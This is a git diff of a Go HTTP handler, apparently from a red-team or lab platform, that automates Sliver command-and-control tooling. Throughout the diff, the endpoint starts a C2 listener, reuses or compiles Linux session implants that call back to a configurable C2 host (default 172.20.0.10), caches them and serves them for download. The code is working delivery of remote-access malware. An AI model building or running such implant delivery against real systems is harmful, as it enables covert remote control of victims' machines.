@@ -3,13 +3,17 @@ package api
 // implant.go — GET /api/v1/implant/linux
 //
 // On first request this handler:
-//   1. Starts a Sliver HTTP listener on port 80 (idempotent — skips if one already exists).
-//   2. Compiles a Linux amd64 HTTP session implant via the Sliver Generate gRPC (this takes ~1–2 min).
+//   1. Checks if a matching Linux amd64 HTTP session implant already exists in
+//      Sliver's build cache (ImplantBuilds).  If so, serves it immediately via
+//      Regenerate (avoids recompilation, ~instant).
+//   2. Otherwise calls Generate with HTTPC2ConfigName:"default" to compile a
+//      fresh implant (~1-2 min).  Generate is synchronous and returns the
+//      binary directly on success.
 //   3. Caches the binary in-process so subsequent requests are instant.
 //
 // Query parameters (all optional):
 //   arch   amd64 (default) | arm64
-//   c2     C2 host the beacon calls back to (default: server's C2_HOST env or 172.20.0.10)
+//   c2     C2 host the beacon calls back to (default: C2_HOST env or 172.20.0.10)
 //   port   HTTP listener port (default: 80)
 
 import (
@@ -19,6 +23,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -29,6 +34,7 @@ import (
 const (
 	defaultC2Host       = "172.20.0.10"
 	defaultListenerPort = uint32(80)
+	buildTimeout        = 15 * time.Minute
 )
 
 // implantCache holds a generated implant binary per (arch, c2host, port) key.
@@ -39,7 +45,7 @@ type implantCache struct {
 
 var globalImplantCache = &implantCache{cache: make(map[string][]byte)}
 
-// handleGetImplantLinux serves a generated Linux beacon binary.
+// handleGetImplantLinux serves a generated Linux session binary.
 func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 	arch := r.URL.Query().Get("arch")
 	if arch == "" {
@@ -57,6 +63,7 @@ func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
+	c2URL := fmt.Sprintf("http://%s:%d", c2Host, port)
 	cacheKey := fmt.Sprintf("%s_%s_%d", arch, c2Host, port)
 
 	globalImplantCache.mu.Lock()
@@ -67,51 +74,87 @@ func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 	}
 	globalImplantCache.mu.Unlock()
 
-	// Ensure the HTTP listener is running before generating the implant.
 	if err := s.ensureHTTPListener(c2Host, port); err != nil {
 		log.Printf("[implant] ensureHTTPListener: %v", err)
 		writeError(w, http.StatusInternalServerError, "could not start HTTP listener: "+err.Error())
 		return
 	}
 
-	log.Printf("[implant] Generating linux/%s session implant → http://%s:%d (this takes ~1-2 min)…", arch, c2Host, port)
-	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Minute)
-	defer cancel()
+	// Reuse an existing build if available (avoids recompilation).
+	var data []byte
+	if buildName, err := s.findMatchingBuild(arch, c2URL); err == nil && buildName != "" {
+		log.Printf("[implant] Reusing existing build: %s", buildName)
+		ctx, cancel := context.WithTimeout(r.Context(), 2*time.Minute)
+		defer cancel()
+		regen, err := s.rpc.Regenerate(ctx, &clientpb.RegenerateReq{ImplantName: buildName})
+		if err == nil && regen.File != nil && len(regen.File.Data) > 0 {
+			data = regen.File.Data
+		}
+	}
 
-	resp, err := s.rpc.Generate(ctx, &clientpb.GenerateReq{
-		Config: &clientpb.ImplantConfig{
-			GOOS:             "linux",
-			GOARCH:           arch,
-			Format:           clientpb.OutputFormat_EXECUTABLE,
-			IsBeacon:         false,
-			HTTPC2ConfigName: "default",
-			C2: []*clientpb.ImplantC2{
-				{Priority: 0, URL: fmt.Sprintf("http://%s:%d", c2Host, port)},
+	if data == nil {
+		// Compile a fresh implant — takes ~1-2 min but is synchronous.
+		log.Printf("[implant] Compiling linux/%s session implant → %s (this takes ~1-2 min)…", arch, c2URL)
+		ctx, cancel := context.WithTimeout(r.Context(), buildTimeout)
+		defer cancel()
+
+		resp, err := s.rpc.Generate(ctx, &clientpb.GenerateReq{
+			Config: &clientpb.ImplantConfig{
+				GOOS:             "linux",
+				GOARCH:           arch,
+				Format:           clientpb.OutputFormat_EXECUTABLE,
+				IsBeacon:         false,
+				HTTPC2ConfigName: "default",
+				C2: []*clientpb.ImplantC2{
+					{Priority: 0, URL: c2URL},
+				},
 			},
-		},
-	})
-	if err != nil {
-		log.Printf("[implant] Generate RPC error: %v", err)
-		writeError(w, http.StatusInternalServerError, "implant generation failed: "+err.Error())
-		return
-	}
-	if resp.File == nil || len(resp.File.Data) == 0 {
-		writeError(w, http.StatusInternalServerError, "implant generation returned empty binary")
-		return
+		})
+		if err != nil {
+			log.Printf("[implant] Generate RPC error: %v", err)
+			writeError(w, http.StatusInternalServerError, "implant generation failed: "+err.Error())
+			return
+		}
+		if resp.File == nil || len(resp.File.Data) == 0 {
+			writeError(w, http.StatusInternalServerError, "implant generation returned empty binary")
+			return
+		}
+		data = resp.File.Data
+		log.Printf("[implant] Compiled linux/%s session implant (%d bytes)", arch, len(data))
 	}
 
-	data := resp.File.Data
 	globalImplantCache.mu.Lock()
 	globalImplantCache.cache[cacheKey] = data
 	globalImplantCache.mu.Unlock()
 
-	log.Printf("[implant] Generated linux/%s session implant (%d bytes)", arch, len(data))
 	serveImplant(w, data, "sliver-session-linux-"+arch)
 }
 
-// ensureHTTPListener starts a Sliver HTTP listener on c2Host:port if one is not
-// already present.  It is intentionally idempotent — calling it multiple times
-// for the same host:port is safe.
+// findMatchingBuild looks through existing ImplantBuilds for one matching
+// the requested arch and C2 URL.  Returns "" if none is found.
+func (s *Server) findMatchingBuild(arch, c2URL string) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	builds, err := s.rpc.ImplantBuilds(ctx, &commonpb.Empty{})
+	if err != nil {
+		return "", err
+	}
+	for name, cfg := range builds.GetConfigs() {
+		if cfg.GetGOOS() != "linux" || cfg.GetGOARCH() != arch {
+			continue
+		}
+		for _, c2 := range cfg.GetC2() {
+			if strings.EqualFold(c2.GetURL(), c2URL) {
+				return name, nil
+			}
+		}
+	}
+	return "", nil
+}
+
+// ensureHTTPListener starts a Sliver HTTP listener on c2Host:port if one is
+// not already present.
 func (s *Server) ensureHTTPListener(host string, port uint32) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
